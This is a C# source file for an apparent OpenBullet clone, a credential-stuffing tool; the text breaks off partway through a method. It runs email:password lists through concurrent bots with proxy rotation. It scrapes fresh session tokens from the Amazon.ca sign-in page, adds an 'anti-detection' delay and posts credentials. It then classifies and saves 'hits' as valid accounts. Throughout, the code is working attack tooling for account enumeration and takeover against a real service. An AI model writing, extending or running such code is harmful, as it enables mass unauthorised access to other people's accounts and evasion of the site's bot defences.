using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using Newtonsoft.Json;
using ICSharpCode.AvalonEdit;
using ICSharpCode.AvalonEdit.Highlighting;
using ICSharpCode.AvalonEdit.Highlighting.Xshd;
using System.Xml;
using RuriLib;
using Leaf.xNet;

namespace OpenBullet
{
    public partial class MainWindow : Window
    {
        private TextEditor codeEditor;
        private Models.Config currentConfig;
        private RuriLib.Config ruriConfig;
        private bool isRunning = false;
        private List<string> currentWordlist = new List<string>();
        private List<string> currentProxies = new List<string>();
        private int totalEntries = 0;
        private int proxyIndex = 0;
        private readonly object proxyLock = new object();
        private System.Threading.SemaphoreSlim botSemaphore;
        
        // Enhanced statistics tracking
        private readonly object statsLock = new object();
        private int keySignInCount = 0;
        private int keyNoAccountCount = 0;
        private int keyEmailPhoneCount = 0;
        private int keyOthersCount = 0;
        private int httpErrorCount = 0;
        private long totalResponseTime = 0;
        private long totalResponseSize = 0;
        private int responseCount = 0;
        
        public MainWindow()
        {
            InitializeComponent();
            InitializeCodeEditor();
            LoadTheme();
            SetupEventHandlers();
            InitializeApplication();
        }
        
        private void InitializeCodeEditor()
        {
            // Create AvalonEdit TextEditor
            codeEditor = new TextEditor
            {
                Background = (System.Windows.Media.Brush)FindResource("BackgroundMain"),
                Foreground = (System.Windows.Media.Brush)FindResource("ForegroundMain"),
                FontFamily = new System.Windows.Media.FontFamily("Consolas"),
                FontSize = 12,
                ShowLineNumbers = true
            };
            
            // Load LoliScript syntax highlighting
            try
            {
                if (File.Exists("LSHighlighting.xshd"))
                {
                    using (var reader = new XmlTextReader("LSHighlighting.xshd"))
                    {
                        var highlighting = HighlightingLoader.Load(reader, HighlightingManager.Instance);
                        codeEditor.SyntaxHighlighting = highlighting;
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Could not load syntax highlighting: {ex.Message}");
            }
            
            // Add editor to container
            codeEditorContainer.Content = codeEditor;
        }
        
        private void LoadTheme()
        {
            // Apply theme from OBSettings
            if (App.OBSettings != null && App.OBSettings.Themes != null)
            {
                var theme = App.OBSettings.Themes;
                
                // Update resource dictionary with theme colors
                Resources["BackgroundMain"] = new System.Windows.Media.SolidColorBrush(
                    (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(theme.BackgroundMain));
                Resources["BackgroundSecondary"] = new System.Windows.Media.SolidColorBrush(
                    (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(theme.BackgroundSecondary));
                Resources["ForegroundMain"] = new System.Windows.Media.SolidColorBrush(
                    (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(theme.ForegroundMain));
                Resources["ForegroundGood"] = new System.Windows.Media.SolidColorBrush(
                    (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(theme.ForegroundGood));
                Resources["ForegroundBad"] = new System.Windows.Media.SolidColorBrush(
                    (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(theme.ForegroundBad));
                Resources["ForegroundCustom"] = new System.Windows.Media.SolidColorBrush(
                    (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(theme.ForegroundCustom));
            }
        }
        
        private void SetupEventHandlers()
        {
            // Additional setup can be done here
        }
        
        private void LoadConfig_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Anomaly Config Files (*.anom)|*.anom|All Files (*.*)|*.*",
                Title = "Load Config"
            };
            
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    LoadConfigFromFile(dialog.FileName);
                    LogMessage($"Loaded config: {Path.GetFileName(dialog.FileName)}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading config: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }
        
        private void LoadConfigFromFile(string filePath)
        {
            try
            {
                // Load using RuriLib's native config loading
                ruriConfig = RuriLib.IOManager.LoadConfig(filePath);
                
                // Also keep our model for UI purposes
                var content = File.ReadAllText(filePath);
                currentConfig = ParseConfigFile(content);
                
                // Update UI
                if (currentConfig?.Settings != null)
                {
                    txtConfigName.Text = currentConfig.Settings.Name ?? "";
                }
                else
                {
                    txtConfigName.Text = ruriConfig.Settings.Name ?? "";
                }
                
                // Load script into editor
                codeEditor.Text = currentConfig?.Script ?? ruriConfig.Script ?? "";
                
                statusText.Text = $"Loaded: {Path.GetFileName(filePath)}";
                lblConfigStatus.Text = $"✅ {ruriConfig.Settings.Name}";
                lblConfigStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.LimeGreen);
                LogMessage($"✅ Config loaded with RuriLib: {ruriConfig.Settings.Name}");
            }
            catch (Exception ex)
            {
                LogMessage($"❌ Error loading config with RuriLib: {ex.Message}");
                // Fallback to custom parsing
                var content = File.ReadAllText(filePath);
                currentConfig = ParseConfigFile(content);
                
                if (currentConfig?.Settings != null)
                {
                    txtConfigName.Text = currentConfig.Settings.Name ?? "";
                }
                
                codeEditor.Text = currentConfig?.Script ?? "";
                statusText.Text = $"Loaded (fallback): {Path.GetFileName(filePath)}";
            }
        }
        
        private Models.Config ParseConfigFile(string content)
        {
            var config = new Models.Config();
            
            try
            {
                // Parse [SETTINGS] section
                var settingsMatch = System.Text.RegularExpressions.Regex.Match(
                    content, @"\[SETTINGS\]\s*({.*?})", System.Text.RegularExpressions.RegexOptions.Singleline);
                
                if (settingsMatch.Success)
                {
                    config.Settings = JsonConvert.DeserializeObject<Models.ConfigSettings>(settingsMatch.Groups[1].Value);
                }
                
                // Parse [SCRIPT] section
                var scriptMatch = System.Text.RegularExpressions.Regex.Match(
                    content, @"\[SCRIPT\]\s*(.*)", System.Text.RegularExpressions.RegexOptions.Singleline);
                
                if (scriptMatch.Success)
                {
                    config.Script = scriptMatch.Groups[1].Value.Trim();
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Error parsing config: {ex.Message}");
            }
            
            return config;
        }
        
        private void SaveConfig_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new SaveFileDialog
            {
                Filter = "Anomaly Config Files (*.anom)|*.anom|All Files (*.*)|*.*",
                Title = "Save Config"
            };
            
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    SaveConfigToFile(dialog.FileName);
                    LogMessage($"Saved config: {Path.GetFileName(dialog.FileName)}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error saving config: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }
        
        private void SaveConfigToFile(string filePath)
        {
            // Update config from UI
            if (currentConfig == null) currentConfig = new Models.Config();
            if (currentConfig.Settings == null) currentConfig.Settings = new Models.ConfigSettings();
            
            currentConfig.Settings.Name = txtConfigName.Text;
            currentConfig.Settings.Author = "OpenBullet Clone User";
            currentConfig.Script = codeEditor.Text;
            
            // Generate config file content
            var configContent = "[SETTINGS]\n";
            configContent += JsonConvert.SerializeObject(currentConfig.Settings, Newtonsoft.Json.Formatting.Indented);
            configContent += "\n\n[SCRIPT]\n";
            configContent += currentConfig.Script;
            
            File.WriteAllText(filePath, configContent);
            statusText.Text = $"Saved: {Path.GetFileName(filePath)}";
        }
        
        private async void StartRunner_Click(object sender, RoutedEventArgs e)
        {
            if (isRunning)
            {
                LogMessage("Runner is already running!");
                return;
            }
            
            if (currentConfig == null && ruriConfig == null)
            {
                MessageBox.Show("Please load a config first!", "No Config", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            
            try
            {
                isRunning = true;
                btnStart.IsEnabled = false;
                btnStop.IsEnabled = true;
                btnPause.IsEnabled = true;
                statusText.Text = "Running...";
                
                LogMessage("Starting runner...");
                
                // Reset statistics for new run
                ResetStatistics();
                
                // Execute the LoliScript with real engine
                await RunConfigAsync();
            }
            catch (Exception ex)
            {
                LogMessage($"Error starting runner: {ex.Message}");
                isRunning = false;
                btnStart.IsEnabled = true;
                btnStop.IsEnabled = false;
                btnPause.IsEnabled = false;
            }
        }
        
        private async Task RunConfigAsync()
        {
            LogMessage("🚀 Initializing PROFESSIONAL LoliScript engine...");
            
            try
            {
                // Use loaded wordlist or fallback to sample data with obviously fake emails
                var testData = currentWordlist.Count > 0 ? currentWordlist.ToArray() : 
                    new[] { 
                        "definitelynotreal12345@fakeemail999.com:password123",
                        "totallybogusemail98765@nonexistent888.org:123456789",
                        "obviouslyfake54321@impossiblesite777.net:password",
                        "notanemailatall33333@bogussite666.com:qwerty123",
                        "completelyfake77777@invaliddomain555.org:letmein",
                        "admin@gmail.com:realpassword",  // Mix of fake and potentially real
                        "test@yahoo.com:test123",        // To compare results
                        "user@hotmail.com:password"
                    };
                
                totalEntries = testData.Length;
                var botCount = int.TryParse(txtBotCount.Text, out var bots) ? bots : 10;
                botSemaphore = new System.Threading.SemaphoreSlim(botCount);
                
                LogMessage($"📊 Starting with {totalEntries} entries using {botCount} concurrent bots");
                LogMessage($"🌐 Proxy pool: {currentProxies.Count} proxies available");
                LogMessage($"⚙️ Use Proxies: {chkUseProxies.IsChecked}");
                
                var tested = 0;
                var hits = 0;
                var fails = 0;
                var startTime = DateTime.Now;
                var testLock = new object();
                
                // Multi-threaded execution
                var tasks = testData.Select(async dataLine =>
                {
                    await botSemaphore.WaitAsync();
                    try
                    {
                        var currentTested = 0;
                        lock (testLock) { currentTested = ++tested; }
                        
                        // Update UI
                        Dispatcher.Invoke(() =>
                        {
                            lblTested.Text = currentTested.ToString();
                            var elapsed = DateTime.Now - startTime;
                            var cpm = elapsed.TotalMinutes > 0 ? (currentTested / elapsed.TotalMinutes) : 0;
                            lblCPM.Text = Math.Round(cpm).ToString();
                            lblQuickCPM.Text = Math.Round(cpm).ToString();
                            
                            // Update progress bar
                            var progress = totalEntries > 0 ? (double)currentTested / totalEntries * 100 : 0;
                            progressBar.Value = progress;
                        });
                        
                        LogMessage($"🔍 Bot #{currentTested} Processing: {dataLine.Split(':')[0]}");
                        
                        try
                        {
                            // Execute with proxy support
                            var proxy = chkUseProxies.IsChecked == true ? GetNextProxy() : null;
                            var result = await ExecuteLoliScriptWithProxy(dataLine, proxy);
                            
                            if (result.IsSuccess)
                            {
                                lock (testLock) { hits++; }
                                LogMessage($"✅ HIT: {dataLine.Split(':')[0]} - {result.Message}");
                                
                                // Save to database if enabled
                                if (chkSaveHits.IsChecked == true)
                                {
                                    await SaveHitToDatabase(dataLine, result.Message, proxy, 0, 0, "", "");
                                }
                            }
                            else
                            {
                                lock (testLock) { fails++; }
                                LogMessage($"❌ FAIL: {dataLine.Split(':')[0]} - {result.Message}");
                            }
                            
                            // Update UI with enhanced statistics
                            Dispatcher.Invoke(() =>
                            {
                                lblHits.Text = hits.ToString();
                                lblFails.Text = fails.ToString();
                                lblQuickHits.Text = hits.ToString();
                                lblQuickFails.Text = fails.ToString();
                                
                                // Calculate and display success rate
                                var totalProcessed = hits + fails;
                                var successRate = totalProcessed > 0 ? Math.Round((double)hits / totalProcessed * 100, 1) : 0;
                                lblSuccessRate.Text = $"{successRate}%";
                                
                                // Update progress text
                                lblProgressText.Text = $"{totalProcessed}/{totalEntries} - {successRate}% valid accounts";
                            });
                        }
                        catch (Exception ex)
                        {
                            lock (testLock) { fails++; }
                            LogMessage($"❌ ERROR: {dataLine.Split(':')[0]} - {ex.Message}");
                            Dispatcher.Invoke(() => 
                            {
                                lblFails.Text = fails.ToString();
                                lblQuickFails.Text = fails.ToString();
                                
                                // Calculate and display success rate
                                var totalProcessedError = hits + fails;
                                var successRate = totalProcessedError > 0 ? Math.Round((double)hits / totalProcessedError * 100, 1) : 0;
                                lblSuccessRate.Text = $"{successRate}%";
                                lblProgressText.Text = $"{totalProcessedError}/{totalEntries} - {successRate}% valid accounts";
                            });
                        }
                    }
                    finally
                    {
                        botSemaphore.Release();
                    }
                }).ToArray();
                
                await Task.WhenAll(tasks);
                
                LogMessage($"🎉 Multi-threaded runner completed! Tested: {tested}, Hits: {hits}, Fails: {fails}");
            }
            catch (Exception ex)
            {
                LogMessage($"💥 Runner error: {ex.Message}");
            }
            finally
            {
                isRunning = false;
                Dispatcher.Invoke(() =>
                {
                    btnStart.IsEnabled = true;
                    btnStop.IsEnabled = false;
                    btnPause.IsEnabled = false;
                    statusText.Text = "Completed";
                    progressBar.Value = 100;
                });
            }
        }
        
        private async Task<ExecutionResult> ExecuteLoliScriptProperly(string dataLine)
        {
            try
            {
                // Parse data line (email:password format)
                var parts = dataLine.Split(':');
                if (parts.Length < 2)
                {
                    return new ExecutionResult(false, "Invalid data format");
                }
                
                var email = parts[0];
                var password = parts[1];
                
                LogMessage($"⚡ Executing LoliScript (proper parsing) for: {email}");
                
                // Get the script from current config
                var script = currentConfig?.Script ?? "";
                if (string.IsNullOrEmpty(script))
                {
                    return new ExecutionResult(false, "No script to execute");
                }
                
                // Replace variables according to LoliScript specs (<USER>, <PASS>)
                script = script.Replace("<USER>", email);
                script = script.Replace("<PASS>", password);
                
                // Parse LoliScript according to LSDoc.xml specifications
                var commands = ParseLoliScript(script);
                
                LogMessage($"📝 Parsed {commands.Count} LoliScript commands");
                
                // Execute commands in sequence
                var response = "";
                
                foreach (var command in commands)
                {
                    if (command.Type == "REQUEST")
                    {
                        LogMessage($"🌐 Executing REQUEST: {command.Method} {command.Url}");
                        response = await ExecuteRequestCommand(command);
                        LogMessage($"📡 Response length: {response.Length} chars");
                    }
                    else if (command.Type == "KEYCHECK")
                    {
                        LogMessage($"🔍 Executing KEYCHECK with {command.Keychains.Count} keychains");
                        return ExecuteKeyCheckCommand(command, response);
                    }
                }
                
                return new ExecutionResult(false, "No KEYCHECK found in script");
            }
            catch (Exception ex)
            {
                return new ExecutionResult(false, $"LoliScript execution error: {ex.Message}");
            }
        }
        
        private List<LoliCommand> ParseLoliScript(string script)
        {
            var commands = new List<LoliCommand>();
            var lines = script.Split('\n');
            
            for (int i = 0; i < lines.Length; i++)
            {
                var line = lines[i].Trim();
                
                // Skip empty lines and double-hash comments (## = comment, # = potential command)
                if (string.IsNullOrEmpty(line) || line.StartsWith("##"))
                    continue;
                
                // Parse REQUEST command (including #POST REQUEST format)
                if (line.Contains("REQUEST") && (line.Contains("POST") || line.Contains("GET")))
                {
                    var requestCmd = ParseRequestCommand(lines, ref i);
                    if (requestCmd != null)
                        commands.Add(requestCmd);
                }
                // Parse KEYCHECK command
                else if (line.StartsWith("KEYCHECK"))
                {
                    var keycheckCmd = ParseKeyCheckCommand(lines, ref i);
                    if (keycheckCmd != null)
                        commands.Add(keycheckCmd);
                }
            }
            
            return commands;
        }
        
        private LoliCommand ParseRequestCommand(string[] lines, ref int index)
        {
            var command = new LoliCommand { Type = "REQUEST" };
            var currentLine = lines[index].Trim();
            
            // Extract method and URL from line like "#POST REQUEST POST "https://www.amazon.ca/ap/signin""
            if (currentLine.Contains("POST"))
                command.Method = "POST";
            else if (currentLine.Contains("GET"))
                command.Method = "GET";
            
            // Extract URL
            var urlMatch = System.Text.RegularExpressions.Regex.Match(currentLine, "\"(https?://[^\"]+)\"");
            if (urlMatch.Success)
                command.Url = urlMatch.Groups[1].Value;
                
            // Parse subsequent indented lines for parameters
            index++;
            while (index < lines.Length)
            {
                var line = lines[index].Trim();
                if (string.IsNullOrEmpty(line) || (!line.StartsWith(" ") && !line.StartsWith("\t") && 
                    !line.StartsWith("CONTENT") && !line.StartsWith("HEADER") && !line.StartsWith("CONTENTTYPE")))
                {
                    index--; // Step back since this line doesn't belong to REQUEST
                    break;
                }
                
                if (line.StartsWith("CONTENT"))
                {
                    var contentMatch = System.Text.RegularExpressions.Regex.Match(line, "CONTENT \"([^\"]+)\"");
                    if (contentMatch.Success)
                        command.Content = contentMatch.Groups[1].Value;
                }
                else if (line.StartsWith("CONTENTTYPE"))
                {
                    var ctMatch = System.Text.RegularExpressions.Regex.Match(line, "CONTENTTYPE \"([^\"]+)\"");
                    if (ctMatch.Success)
                        command.ContentType = ctMatch.Groups[1].Value;
                }
                else if (line.StartsWith("HEADER"))
                {
                    var headerMatch = System.Text.RegularExpressions.Regex.Match(line, "HEADER \"([^\"]+)\"");
                    if (headerMatch.Success)
                        command.Headers.Add(headerMatch.Groups[1].Value);
                }
                
                index++;
            }
            
            LogMessage($"🔧 Parsed REQUEST: {command.Method} {command.Url}");
            LogMessage($"🔧 Content: {command.Content?.Length ?? 0} chars, ContentType: '{command.ContentType}', Headers: {command.Headers.Count}");
            
            return command;
        }
        
        private LoliCommand ParseKeyCheckCommand(string[] lines, ref int index)
        {
            var command = new LoliCommand { Type = "KEYCHECK" };
            
            // Parse KEYCHECK parameters and keychains
            index++;
            string currentKeychain = "";
            
            while (index < lines.Length)
            {
                var line = lines[index].Trim();
                if (string.IsNullOrEmpty(line) || (!line.Contains("KEYCHAIN") && !line.Contains("KEY") && 
                    !line.StartsWith(" ") && !line.StartsWith("\t")))
                {
                    index--;
                    break;
                }
                
                if (line.Contains("KEYCHAIN"))
                {
                    if (line.Contains("Success") || line.Contains("SUCCESS"))
                        currentKeychain = "SUCCESS";
                    else if (line.Contains("Failure") || line.Contains("FAILURE"))
                        currentKeychain = "FAILURE";
                    else
                        currentKeychain = "CUSTOM";
                        
                    if (!command.Keychains.ContainsKey(currentKeychain))
                        command.Keychains[currentKeychain] = new List<string>();
                }
                else if (line.Contains("KEY") && !string.IsNullOrEmpty(currentKeychain))
                {
                    var keyMatch = System.Text.RegularExpressions.Regex.Match(line, "KEY \"([^\"]+)\"");
                    if (keyMatch.Success)
                        command.Keychains[currentKeychain].Add(keyMatch.Groups[1].Value);
                }
                
                index++;
            }
            
            return command;
        }
        
        private async Task<string> ExecuteRequestCommand(LoliCommand command)
        {
            try
            {
                using (var httpClient = new HttpClient())
                {
                    // Configure client
                    httpClient.Timeout = TimeSpan.FromSeconds(30);
                    httpClient.DefaultRequestHeaders.Add("User-Agent", 
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36");
                    
                    // Add headers
                    foreach (var header in command.Headers)
                    {
                        var parts = header.Split(':');
                        if (parts.Length == 2)
                        {
                            try
                            {
                                httpClient.DefaultRequestHeaders.TryAddWithoutValidation(parts[0].Trim(), parts[1].Trim());
                            }
                            catch { /* Ignore invalid headers */ }
                        }
                    }
                    
                    // Execute request
                    if (command.Method == "POST")
                    {
                        // Fix mediaType error by ensuring we have a valid content type
                        var contentType = string.IsNullOrEmpty(command.ContentType) ? 
                                         "application/x-www-form-urlencoded" : command.ContentType;
                        
                        LogMessage($"📦 POST Content: {(command.Content?.Length ?? 0)} chars, Type: {contentType}");
                        
                        var content = new System.Net.Http.StringContent(command.Content ?? "", System.Text.Encoding.UTF8, contentType);
                        var response = await httpClient.PostAsync(command.Url, content);
                        
                        var responseText = await response.Content.ReadAsStringAsync();
                        LogMessage($"📋 HTTP Status: {response.StatusCode}, Response preview: {(responseText.Length > 100 ? responseText.Substring(0, 100) + "..." : responseText)}");
                        
                        return responseText;
                    }
                    else if (command.Method == "GET")
                    {
                        var response = await httpClient.GetAsync(command.Url);
                        return await response.Content.ReadAsStringAsync();
                    }
                }
                
                return "";
            }
            catch (Exception ex)
            {
                LogMessage($"❌ HTTP Request failed: {ex.Message}");
                return "";
            }
        }
        
        private ExecutionResult ExecuteKeyCheckCommand(LoliCommand command, string response)
        {
            try
            {
                LogMessage($"🔍 DETAILED KEYCHECK ANALYSIS:");
                LogMessage($"   📄 Response length: {response.Length} chars");
                LogMessage($"   🔍 Checking {command.Keychains.Count} keychains");
                
                // Log first 500 chars of response for analysis
                var responsePreview = response.Length > 500 ? response.Substring(0, 500) + "..." : response;
                LogMessage($"   📄 Response preview: {responsePreview}");
                
                // CRITICAL: Check FAILURE keys FIRST (they're more specific!)
                if (command.Keychains.ContainsKey("FAILURE"))
                {
                    LogMessage($"   🔍 Checking {command.Keychains["FAILURE"].Count} FAILURE keys first...");
                    
                    foreach (var key in command.Keychains["FAILURE"])
                    {
                        LogMessage($"   🔍 Looking for FAILURE key: '{key}'");
                        
                        if (response.Contains(key))
                        {
                            // Track specific failure key found
                            lock (statsLock)
                            {
                                if (key.Contains("No account found"))
                                {
                                    keyNoAccountCount++;
                                    Dispatcher.BeginInvoke(new Action(() => lblKeyNoAccount.Text = keyNoAccountCount.ToString()));
                                }
                                else if (key.Contains("ap_ra_email_or_phone"))
                                {
                                    keyEmailPhoneCount++;
                                    Dispatcher.BeginInvoke(new Action(() => lblKeyEmailPhone.Text = keyEmailPhoneCount.ToString()));
                                }
                                else
                                {
                                    keyOthersCount++;
                                    Dispatcher.BeginInvoke(new Action(() => lblKeyOthers.Text = keyOthersCount.ToString()));
                                }
                            }
                            
                            LogMessage($"   ❌ FOUND FAILURE KEY: '{key}' - ACCOUNT DOES NOT EXIST");
                            return new ExecutionResult(false, $"INVALID: No account exists (Amazon error: '{key}')");
                        }
                        else
                        {
                            LogMessage($"   ✅ FAILURE key '{key}' NOT found (good)");
                        }
                    }
                }
                
                // Only check SUCCESS keys if NO failure keys were found
                if (command.Keychains.ContainsKey("SUCCESS"))
                {
                    LogMessage($"   🔍 No failure keys found, checking {command.Keychains["SUCCESS"].Count} SUCCESS keys...");
                    
                    foreach (var key in command.Keychains["SUCCESS"])
                    {
                        LogMessage($"   🔍 Looking for SUCCESS key: '{key}'");
                        
                        if (response.Contains(key))
                        {
                            // Track specific success key found
                            lock (statsLock)
                            {
                                if (key.Contains("Sign-In"))
                                {
                                    keySignInCount++;
                                    Dispatcher.BeginInvoke(new Action(() => lblKeySignIn.Text = keySignInCount.ToString()));
                                }
                            }
                            
                            LogMessage($"   ✅ FOUND SUCCESS KEY: '{key}' - ACCOUNT EXISTS");
                            return new ExecutionResult(true, $"VALID: Account exists (Amazon shows: '{key}')");
                        }
                        else
                        {
                            LogMessage($"   ❌ SUCCESS key '{key}' NOT found");
                        }
                    }
                }
                
                // No keys matched at all - this indicates potential issues
                lock (statsLock)
                {
                    keyOthersCount++;
                    Dispatcher.BeginInvoke(new Action(() => lblKeyOthers.Text = keyOthersCount.ToString()));
                }
                
                LogMessage($"   ⚠️ NO EXPECTED KEYS FOUND - Amazon may be using anti-bot protection");
                LogMessage($"   📊 Response contains 'Sign-In ': {response.Contains("Sign-In ")}");
                LogMessage($"   📊 Response contains 'ap_ra_email_or_phone': {response.Contains("ap_ra_email_or_phone")}");
                LogMessage($"   📊 Response contains 'No account found': {response.Contains("No account found")}");
                
                return new ExecutionResult(false, "UNKNOWN: Amazon response doesn't match expected patterns");
            }
            catch (Exception ex)
            {
                lock (statsLock)
                {
                    keyOthersCount++;
                    Dispatcher.BeginInvoke(new Action(() => lblKeyOthers.Text = keyOthersCount.ToString()));
                }
                return new ExecutionResult(false, $"KEYCHECK error: {ex.Message}");
            }
        }
        
        // Advanced LoliScript parsing and execution methods
        private List<LoliCommand> ParseAdvancedLoliScript(string script)
        {
            var commands = new List<LoliCommand>();
            var lines = script.Split('\n');
            
            for (int i = 0; i < lines.Length; i++)
            {
                var line = lines[i].Trim();
                
                // Skip empty lines and double-hash comments
                if (string.IsNullOrEmpty(line) || line.StartsWith("##"))
                    continue;
                
                // Parse different command types
                if (line.Contains("REQUEST"))
                {
                    var requestCmd = ParseRequestCommand(lines, ref i);
                    if (requestCmd != null) commands.Add(requestCmd);
                }
                else if (line.StartsWith("KEYCHECK"))
                {
                    var keycheckCmd = ParseKeyCheckCommand(lines, ref i);
                    if (keycheckCmd != null) commands.Add(keycheckCmd);
                }
                else if (line.StartsWith("PARSE"))
                {
                    var parseCmd = AdvancedLoliScriptExtensions.ParseParseCommand(line);
                    if (parseCmd != null) commands.Add(parseCmd);
                }
                else if (line.StartsWith("CAPTCHA"))
                {
                    var captchaCmd = AdvancedLoliScriptExtensions.ParseCaptchaCommand(line);
                    if (captchaCmd != null) commands.Add(captchaCmd);
                }
                else if (line.StartsWith("RECAPTCHA"))
                {
                    var recaptchaCmd = AdvancedLoliScriptExtensions.ParseRecaptchaCommand(line);
                    if (recaptchaCmd != null) commands.Add(recaptchaCmd);
                }
                else if (line.StartsWith("NAVIGATE"))
                {
                    var navCmd = AdvancedLoliScriptExtensions.ParseNavigateCommand(line);
                    if (navCmd != null) commands.Add(navCmd);
                }
                else if (line.StartsWith("BROWSERACTION"))
                {
                    var browserCmd = AdvancedLoliScriptExtensions.ParseBrowserActionCommand(line);
                    if (browserCmd != null) commands.Add(browserCmd);
                }
            }
            
            return commands;
        }
        
        private async Task<string> ExecuteRequestWithProxy(LoliCommand command, string proxy)
        {
            try
            {
                LogMessage($"🔄 IMPLEMENTING ORIGINAL OPENBULLET APPROACH with Leaf.xNet.dll");
                
                // Create Leaf.xNet HttpRequest (like original OpenBullet)
                using (var request = new Leaf.xNet.HttpRequest())
                {
                    // Configure Leaf.xNet with original OpenBullet settings
                    var timeout = int.TryParse(txtTimeout.Text, out var t) ? t : 30;
                    request.ConnectTimeout = timeout * 1000; // Leaf.xNet uses milliseconds
                    request.ReadWriteTimeout = timeout * 1000;
                    request.KeepAlive = true; // Original OpenBullet uses connection keep-alive
                    request.AllowAutoRedirect = true;
                    request.MaximumAutomaticRedirections = 8; // From .anom MaxRedirects: 8
                    
                    // Configure proxy if provided (proper Leaf.xNet way)
                    if (!string.IsNullOrEmpty(proxy))
                    {
                        var parts = proxy.Split(':');
                        if (parts.Length == 2 && int.TryParse(parts[1], out var port))
                        {
                            request.Proxy = new Leaf.xNet.HttpProxyClient(parts[0], port);
                            LogMessage($"🌐 Using proxy via Leaf.xNet: {proxy}");
                        }
                    }
                    
                    // Set User-Agent from headers or default
                    var userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36";
                    foreach (var header in command.Headers)
                    {
                        if (header.ToLower().Contains("user-agent"))
                        {
                            var parts = header.Split(':');
                            if (parts.Length >= 2)
                                userAgent = string.Join(":", parts.Skip(1)).Trim();
                        }
                    }
                    request.UserAgent = userAgent;
                    
                    LogMessage($"🚀 STEP 1: GET signin page to establish session and extract fresh tokens...");
                    
                    // *** STEP 1: GET signin page to establish session (Original OpenBullet approach) ***
                    var getResponse = await Task.Run(() => request.Get("https://www.amazon.ca/ap/signin"));
                    var getResponseText = getResponse.ToString();
                    LogMessage($"📡 GET response: {getResponseText.Length} chars, cookies: {request.Cookies.Count}");
                    
                    // *** STEP 2: Extract dynamic tokens from response (Critical!) ***
                    var freshTokens = ExtractAmazonTokens(getResponseText);
                    LogMessage($"🔧 Extracted tokens: appActionToken={freshTokens.AppActionToken?.Length ?? 0} chars");
                    LogMessage($"🔧 Extracted tokens: metadata1={freshTokens.Metadata1?.Length ?? 0} chars");
                    LogMessage($"🔧 Extracted tokens: workflowState={freshTokens.WorkflowState?.Length ?? 0} chars");
                    
                    if (string.IsNullOrEmpty(freshTokens.AppActionToken))
                    {
                        LogMessage($"⚠️ Failed to extract fresh tokens - falling back to static tokens from config");
                    }
                    
                    // *** STEP 3: Anti-detection timing (Original OpenBullet approach) ***
                    var waitTime = 100; // From RLSettings WaitTime: 100
                    LogMessage($"⏱️ Anti-detection wait: {waitTime}ms (like original OpenBullet)");
                    await Task.Delay(waitTime);
                    
                    // *** STEP 4: POST with fresh tokens and maintained session ***
                    LogMessage($"🚀 STEP 2: POST with fresh tokens and session cookies...");
                    
                    if (command.Method == "POST")
                    {
                        // Build POST content with fresh tokens or fallback to config tokens
                        var postContent = BuildPostContent(command.Content, freshTokens);
                        
                        // Add all headers
                        foreach (var header in command.Headers)
                        {
                            var parts = header.Split(':');
                            if (parts.Length >= 2 && !parts[0].Trim().ToLower().Contains("user-agent"))
                            {
                                try
                                {
                                    request.AddHeader(parts[0].Trim(), string.Join(":", parts.Skip(1)).Trim());
                                }
                                catch { /* Ignore invalid headers */ }
                            }
                        }
                        
                        // Start timing the entire request
                        var stopwatch = System.Diagnostics.Stopwatch.StartNew();
                        var response = await Task.Run(() => request.Post(command.Url, postContent, 
                            command.ContentType ?? "application/x-www-form-urlencoded"));
                        stopwatch.Stop();
                        
                        var responseText = response.ToString();
                        
                        // Track response metrics
                        lock (statsLock)
                        {
                            responseCount++;
                            totalResponseTime += stopwatch.ElapsedMilliseconds;
                            totalResponseSize += responseText.Length;
                            
                            var avgResponseTime = responseCount > 0 ? totalResponseTime / responseCount : 0;
                            var avgResponseSize = responseCount > 0 ? totalResponseSize / responseCount / 1024 : 0; // KB
                            
                            Dispatcher.BeginInvoke(new Action(() => 
                            {
                                lblAvgResponseTime.Text = $"{avgResponseTime}ms";
                                lblAvgResponseSize.Text = $"{avgResponseSize}KB";
                            }));
                        }
                        
                        LogMessage($"📋 Leaf.xNet Response: HTTP {response.StatusCode} ({stopwatch.ElapsedMilliseconds}ms, {responseText.Length / 1024}KB) via {proxy ?? "DIRECT"}");
                        LogMessage($"🍪 Session cookies maintained: {request.Cookies.Count} cookies");
                        
                        return responseText;
                    }
                    else if (command.Method == "GET")
                    {
                        var response = await Task.Run(() => request.Get(command.Url));
                        return response.ToString();
                    }
                }
                
                return "";
            }
            catch (Exception ex)
            {
                // Track HTTP errors
                lock (statsLock)
                {
                    httpErrorCount++;
                    Dispatcher.BeginInvoke(new Action(() => lblHttpErrors.Text = httpErrorCount.ToString()));
                }
                
                LogMessage($"❌ Leaf.xNet Request failed via {proxy ?? "DIRECT"}: {ex.Message}");
                return "";
            }
        }
        

        
        private async Task<HttpResult> ExecuteHttpRequest(HttpClient httpClient, string script, string email, string password)
        {
            try
            {
                // Parse POST request details from script
                var lines = script.Split('\n');
                string url = "";
                string content = "";
                var headers = new Dictionary<string, string>();
                
                foreach (var line in lines)
                {
